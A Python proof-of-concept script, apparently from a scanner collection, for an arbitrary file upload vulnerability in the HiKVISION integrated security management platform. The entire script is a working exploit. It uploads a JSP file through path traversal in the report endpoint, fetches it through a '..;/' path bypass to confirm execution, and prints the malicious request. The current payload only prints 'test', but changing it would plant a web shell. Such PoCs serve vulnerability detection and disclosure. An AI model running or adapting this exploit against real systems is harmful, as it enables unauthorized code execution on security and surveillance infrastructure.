'''
Function:
    HiKVISION 综合安防管理平台 isecure report 任意文件上传漏洞
Author:
    spmonkey
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers1 = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a'
        }
        self.headers2 = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url1 = "{}://{}/svm/api/external/report".format(scheme, netloc)
        data = {
            'file': ('../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp', '<%out.print("test");%>', 'application/zip')
        }
        try:
            result1 = requests.post(url=url1, files=data, headers=self.headers1, verify=False, timeout=3, proxies=self.proxies)
            if result1.status_code == 200:
                url2 = "{}://{}/portal/ui/login/..;/..;/new.jsp".format(scheme, netloc)
                result2 = requests.get(url=url2, headers=self.headers2, verify=False, timeout=3, proxies=self.proxies)
                if "test" in result2.text:
                    target = urlparse(url1)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result1.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    self.result_text += "\n"
                    bodys = result1.request.body.decode().split("\r\n")
                    for body in bodys:
                        self.result_text += "\n                 {}".format(body)
                    return True
                else:
                    return False
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False


